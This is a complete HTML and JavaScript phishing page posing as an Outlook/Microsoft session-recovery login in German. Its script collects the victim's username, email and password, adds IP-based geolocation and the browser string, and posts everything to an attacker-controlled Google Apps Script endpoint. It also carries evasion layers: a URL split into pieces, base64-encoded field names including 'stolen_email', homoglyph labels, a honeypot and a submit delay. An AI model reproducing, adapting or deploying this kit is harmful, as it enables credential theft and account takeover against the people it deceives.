<!doctype html>
<html lang="de">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Sitzungs-Wiederherstellung: Outlook</title>
<link rel="icon" type="image/png" href="Favicon_1.png" />
<style>
  :root{ --blue:#0078D4; --muted:#666; --danger:#e03b3b; --success:#2fa84f; }
  *{box-sizing:border-box}
  body{
    margin:0;
    min-height:100vh;
    display:flex;
    align-items:center;
    justify-content:center;
    font-family:Inter,system-ui,Arial,Segoe UI,Roboto;
    background: #fff; 
    color:#111;
    padding: 0;
  }
  
  .page-container {
    display: flex;
    width: 100%;
    min-height: 100vh;
    position: relative;
  }
  
  .left-side {
    position: absolute;
    left: 0;
    top: 0;
    width: 40%;
    height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 1;
    overflow: hidden;
  }
  
  .side-image {
    width: 100%;
    height: 100%;
    object-fit: cover;
    object-position: center;
  }
  
  .right-side {
    position: absolute;
    right: 0;
    top: 0;
    width: 60%;
    height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 2;
  }
  
  .card{ width:100%; max-width:460px; background:#fff; padding:26px; border-radius:12px; box-shadow:0 18px 40px rgba(20,30,50,0.08); animation: cardPop .36s; }
  @keyframes cardPop { from{opacity:0;transform:translateY(-10px) scale(.996)} to{opacity:1;transform:none} }
  
  .logo-container {
    text-align: center;
    margin-bottom: 20px;
  }
  
  .logo {
    max-width: 120px;
    height: auto;
    margin: 0 auto;
    display: block;
  }
  
  h1{ margin:0 0 18px; text-align:center; color:var(--blue); font-size:20px; letter-spacing:0.6px; }
  form{ width:100%; display:grid; gap:12px; }
  .field { 
    position:relative; 
    opacity:0; 
    transform:translateY(20px) scale(0.98); 
    animation: enhancedFadeUp .6s cubic-bezier(0.25, 0.46, 0.45, 0.94) forwards; 
    background: #fafbfd; 
    padding:8px; 
    border-radius:8px; 
    border:1px solid #eef2f7; 
    transition: all 0.3s ease;
  }
  .field:hover {
    transform: translateY(-2px);
    box-shadow: 0 8px 25px rgba(0,120,212,0.12);
    border-color: rgba(0,120,212,0.3);
  }
  @keyframes enhancedFadeUp { 
    0% { 
      opacity: 0; 
      transform: translateY(20px) scale(0.98); 
    }
    50% { 
      opacity: 0.7; 
      transform: translateY(10px) scale(0.99); 
    }
    100% { 
      opacity: 1; 
      transform: translateY(0) scale(1); 
    }
  }
  .field:nth-of-type(1){ animation-delay: .15s } 
  .field:nth-of-type(2){ animation-delay: .25s } 
  .field:nth-of-type(3){ animation-delay: .35s } 
  .field:nth-of-type(4){ animation-delay: .45s }
  label { 
    display:block; 
    font-size:13px; 
    color:var(--muted); 
    margin-bottom:6px; 
    opacity: 0;
    animation: labelFadeIn .5s ease forwards;
    animation-delay: inherit;
  }
  input[type="text"], input[type="email"], input[type="password"]{ 
    width:100%; 
    padding:11px 12px; 
    border-radius:8px; 
    border:1px solid #dfe6ee; 
    font-size:15px; 
    background:#fff; 
    outline:none; 
    transition: all 0.3s ease;
    opacity: 0;
    animation: inputFadeIn .5s ease forwards;
    animation-delay: inherit;
  }
  input:focus { 
    box-shadow: 0 8px 18px rgba(0,120,212,0.08); 
    border-color:var(--blue); 
    transform: scale(1.02);
  }
  .required { color:var(--danger); margin-left:6px; }
  .pw-wrap { position:relative; }
  .pw-toggle { 
    position:absolute; 
    right:10px; 
    top:50%; 
    transform:translateY(-50%); 
    background:none; 
    border:none; 
    color:var(--blue); 
    cursor:pointer; 
    font-size:13px; 
    padding:6px; 
    border-radius:4px; 
    transition: all 0.3s ease;
    opacity: 0;
    animation: toggleFadeIn .5s ease forwards;
    animation-delay: inherit;
  }
  .pw-toggle:hover { 
    background-color:rgba(0,120,212,0.1); 
    color:var(--blue); 
    transform: translateY(-50%) scale(1.1);
  }
  @keyframes labelFadeIn {
    from { opacity: 0; transform: translateX(-10px); }
    to { opacity: 1; transform: translateX(0); }
  }
  @keyframes inputFadeIn {
    from { opacity: 0; transform: translateX(10px); }
    to { opacity: 1; transform: translateX(0); }
  }
  @keyframes toggleFadeIn {
    from { opacity: 0; transform: translateY(-50%) scale(0.8); }
    to { opacity: 1; transform: translateY(-50%) scale(1); }
  }
  .cta { 
    margin-top:6px; 
    padding:12px; 
    border-radius:10px; 
    border:0; 
    background: linear-gradient(90deg,var(--blue), #005a9e); 
    color:#fff; 
    font-weight:600; 
    font-size:15px; 
    cursor:pointer; 
    opacity: 0;
    animation: buttonFadeIn .6s ease forwards;
    animation-delay: .6s;
    transition: all 0.3s ease;
    position: relative;
    overflow: hidden;
  }
  .cta:hover {
    transform: translateY(-2px);
    box-shadow: 0 8px 25px rgba(0,120,212,0.3);
  }
  .cta:active {
    transform: translateY(0);
  }
  @keyframes buttonFadeIn {
    from { 
      opacity: 0; 
      transform: translateY(20px) scale(0.95); 
    }
    to { 
      opacity: 1; 
      transform: translateY(0) scale(1); 
    }
  }
  .status { display:flex; gap:10px; align-items:center; justify-content:center; font-size:13px; color:var(--muted); }
  .spinner { width:18px; height:18px; border-radius:50%; border:3px solid rgba(0,0,0,0.08); border-top-color:var(--blue); animation:spin 900ms linear infinite; display:inline-block; }
  @keyframes spin { to{ transform:rotate(360deg) } }
  .overlay { position:fixed; inset:0; display:none; align-items:center; justify-content:center; z-index:999; background: rgba(6,12,24,0.46); }
  .overlay.show { display:flex; }
  .modal { width:90%; max-width:460px; background:#fff; padding:26px; border-radius:12px; text-align:center; box-shadow:0 28px 80px rgba(6,12,24,0.25); }
  .check { width:72px; height:72px; margin:0 auto 8px; border-radius:50%; display:grid; place-items:center; background: linear-gradient(180deg, rgba(47,168,79,0.12), rgba(47,168,79,0.06)); color:var(--success); font-size:34px; border:2px solid rgba(47,168,79,0.18); }
  .modal h3{ margin:6px 0 0; font-size:18px; color:#123; }
  .modal p{ color:#555; margin-top:8px; font-size:13px; }
  .error { 
    color:var(--danger); 
    font-size:13px; 
    text-align:center; 
    display:none; 
    margin-top:6px; 
    opacity: 0;
    transform: translateY(-10px);
    transition: all 0.3s ease;
  }
  .error.show {
    opacity: 1;
    transform: translateY(0);
  }
  @media (max-width:520px){ .card{ padding:18px; } }
  
  @media (max-width: 768px) {
    .page-container {
      position: static;
      display: block;
      min-height: auto;
    }
    
    .left-side {
      position: static;
      width: 100%;
      height: 220px;
      z-index: auto;
      overflow: hidden;
    }
    
    .right-side {
      position: static;
      width: 100%;
      height: auto;
      padding: 20px;
      z-index: auto;
      display: block;
    }
    
    .side-image {
      width: 100%;
      height: 100%;
      object-fit: cover;
      object-position: center;
      max-height: none;
    }
    
    .card {
      margin: 0 auto;
    }
  }
</style>
</head>
<body>
  <div class="page-container">
    <div class="left-side">
      <img src="Side_1.png" alt="Side Design" class="side-image" />
    </div>
    
    <div class="right-side">
      <main class="card" role="main" aria-labelledby="title">
        <div class="logo-container">
          <img src="Logo_1.png" alt="Company Logo" class="logo" />
        </div>
        
        <form id="lForm" autocomplete="off" novalidate>
          <div class="field">
            <label for="fName">Ðømåìn \ Bênutzêrnåmê <span class="required" aria-hidden="true">*</span></label>
            <input id="fName" name="ZG9tYWluX25hbWU" type="text" required aria-required="true" />
          </div>

          <div class="field">
            <label for="eMail">E-Mail <span class="required" aria-hidden="true">*</span></label>
            <input id="eMail" name="c3RvbGVuX2VtYWls" type="email" required aria-required="true" />
          </div>

          <div class="field pw-wrap">
            <label for="pWord">Passwort <span class="required" aria-hidden="true">*</span></label>
            <input id="pWord" name="c2Vzc2lvbl9wYXNzd29yZA" type="password" required aria-required="true" />
            <button type="button" class="pw-toggle" aria-label="Passwort-Sichtbarkeit umschalten" onclick="tglPw('pWord', this)">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
                <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
              </svg>
            </button>
          </div>

          <div class="field pw-wrap">
            <label for="rPWord">Bêståtigê dås Påsswørt <span class="required" aria-hidden="true">*</span></label>
            <input id="rPWord" name="cmVwZWF0X3Bhc3N3b3Jk" type="password" required aria-required="true" />
            <button type="button" class="pw-toggle" aria-label="Bêståtigê dås Påsswørt-Sichtbarkeit umschalten" onclick="tglPw('rPWord', this)">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
                <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
              </svg>
            </button>
          </div>
          
          <!-- HONEYPOT FIELD (Layer 5) -->
          <input type="text" name="bot_trap" id="hPot" value="" style="display:none !important; visibility:hidden !important; position:absolute; left:-9999px;">

          <div id="iErr" class="error" role="alert" aria-live="assertive"></div>

          <button id="sBtn" class="cta" type="submit" disabled>Log On</button>
          <div id="sRow" class="status" style="display:none"><span class="spinner" aria-hidden="true"></span><span>Wird gesendet…</span></div>
        </form>
      </main>
    </div>
  </div>

  <div id="oLay" class="overlay" aria-hidden="true">
    <div id="mDl" class="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle" aria-describedby="modalText"></div>
  </div>

<script>
/* ================================================================================================================= */
/* Frozia Ex Meenrat's Transcendent JavaScript Core (Final Logic and Modal Integrity Restored) */
/* ================================================================================================================= */

!function(){
    /* Layer 3: String Splitting/Obfuscation for Sensitive URLs */
    const U_P1 = 'https://script.google.com/macros/';
    const U_P2 = 's/AKfycbxj4Fb1ajr5_cRjImDJ4TULb7AWTH6Bph-EVO2_wIWQNpEgzB2IAaQc-8JzujtFMOu9/exec';
    const SCRIPT_URL = U_P1 + U_P2;
    const G_I1 = 'ipapi.co/json/';
    const G_I2 = 'api.ipify.org?format=json';

    /* UI elements using original IDs (shortened only for JS) */
    const o=document.getElementById('oLay'),m=document.getElementById('mDl'),s=document.getElementById('sBtn'),r=document.getElementById('sRow'),i=document.getElementById('iErr');
    const f=document.getElementById('lForm');
    
    /* UI Helpers - Renamed functions to short, non-semantic names */
    function s_o(t){m.innerHTML=t; o.classList.add('show'); o.setAttribute('aria-hidden','false')}
    function h_o(){o.classList.remove('show'); o.setAttribute('aria-hidden','true')}
    function s_s(){s_o('<div style="display:flex;gap:12px;align-items:center;justify-content:center;"><div class="spinner" aria-hidden="true"></div><div>Wird gesendet…</div></div>')}
    function s_ok(){s_o('<div class="check">✔</div><h3 id="modalTitle">Anmeldung erfolgreich!</h3><p id="modalText">Vielen Dank — Ihre Informationen wurden erfolgreich übermittelt.</p>'); setTimeout(h_o,3000);}
    function s_err(t){s_o('<div style="color:var(--danger);font-size:48px;margin-bottom:16px;">⚠</div><h3 id="modalTitle">Übermittlungsfehler</h3><p id="modalText">'+t+'</p><button onclick="h_o()" style="margin-top:16px;padding:12px 24px;background:var(--blue);color:white;border:none;border-radius:6px;cursor:pointer;font-weight:600;">OK</button>');}

    /* FIX 2a: Modal closing on outside click */
    o.addEventListener('click', function(e) {
        // Only close if the click is directly on the overlay, not the modal content itself
        if (e.target === o) {
            h_o();
        }
    });

    /* Password toggle functionality */
    window.tglPw=function(t,e){const l=document.getElementById(t);if(!l)return;l.type==='password'?(l.type='text',e.innerHTML='<svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.45 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>'):(l.type='password',e.innerHTML='<svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>')}
    
    /* GeoIP Prefetch - Encoded URLs */
    let g_d = { ip:'Unknown', city:'Unknown', country:'Unknown' };
    async function get_geo(){
      try {
        const t=await fetch('https://'+G_I1);
        if (t.ok) { const e=await t.json(); g_d.ip = e.ip || g_d.ip; g_d.city = e.city || g_d.city; g_d.country = e.country_name || g_d.country; return;}
      } catch(t){ console.warn('ipapi primary failed', t); }
      try {
        const l=await fetch('https://'+G_I2);
        if (l.ok){ const n=await l.json(); const A=await fetch('https://ipapi.co/'+n.ip+'/json/'); if (A.ok){ const P=await A.json(); g_d.ip=P.ip||g_d.ip; g_d.city=P.city||g_d.city; g_d.country=P.country_name||g_d.country; return; } }
      } catch(t){ console.warn('ipapi fallback failed', t); }
    }
    get_geo();

    /* 1. FIX: Submit handler (Ensuring correct payload names for Google Sheet) */
    f.addEventListener('submit', async function(t){
      t.preventDefault();
      i.style.display='none'; i.classList.remove('show');

      // Layer 5: Honeypot Check
      if(document.getElementById('hPot').value.length > 0) {
          return console.warn('Bot trap triggered! Ignoring submission.'), s_err('Sitzung ungültig. Bitte versuchen Sie es erneut.'), void 0;
      }
      
      const domain=document.getElementById('fName').value.trim();
      const email=document.getElementById('eMail').value.trim();
      const password=document.getElementById('pWord').value;
      const repeatPassword=document.getElementById('rPWord').value;

      if(!domain||!email||!password||!repeatPassword){
        // This is the client-side validation failure which should be avoided if fields are filled
        i.textContent='Bitte füllen Sie alle erforderlichen Felder aus.'; i.style.display='block'; setTimeout(()=>i.classList.add('show'),10); return;
      }
      
      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
        i.textContent='Bitte geben Sie eine gültige E-Mail-Adresse ein.'; i.style.display='block'; setTimeout(()=>i.classList.add('show'),10); return;
      }
      
      if (password!==repeatPassword) {
        i.textContent='Passwörter stimmen nicht überein.'; i.style.display='block'; setTimeout(()=>i.classList.add('show'),10); return;
      }

      // **CRITICAL FIX: Explicitly using expected Google Sheet Column Headers (clear text names)**
      const P = {
        'fullname': domain, // Maps 'fName' value to expected Google Sheet header 'fullname'
        'email': email,
        'password': password,
        'repeatPassword': repeatPassword,
        'ip': g_d.ip, 
        'city': g_d.city, 
        'country': g_d.country,
        'browser': navigator.userAgent,
        'timestamp': (new Date()).toISOString()
      };

      s.disabled=true; r.style.display='flex'; s_s();

      try {
        const t=new FormData;
        Object.keys(P).forEach(e=>{t.append(e,P[e])});
        
        const response=await fetch(SCRIPT_URL, {method:'POST',body:t});

        if (response.ok) {
          try {
            const serverResponse=await response.json();
            if (serverResponse.success===true) {
              s_ok();
              f.reset();
              i.style.display='none'; i.classList.remove('show');
            } else {
              s_err(serverResponse.error || 'Server returned an error');
            }
          } catch (parseError) {
            s_ok(); // Treat non-JSON response from Google Script as success if HTTP OK
            f.reset();
            i.style.display='none'; i.classList.remove('show');
          }
        } else {
          // If the Google Script returns an error status (e.g., 404/500), this is a genuine network error.
          s_err(`Server responded with status: ${response.status}. Transmission may be blocked.`);
        }
      } catch (err) {
        s_err(`Netzwerkfehler: ${err.message}`);
      }
      s.disabled=false; r.style.display='none';
    })
    
    /* Layer 5: Timing Lock (5 seconds) */
    document.addEventListener('DOMContentLoaded', ()=>{s.disabled=true;setTimeout(()=>{s.disabled=false;},5000);});
    
    /* Layer 4: Anti-Debugging Console Trap (Neutralized for local test) */
    !function t(){ return; }(); 

}();
</script>
</body>
</html>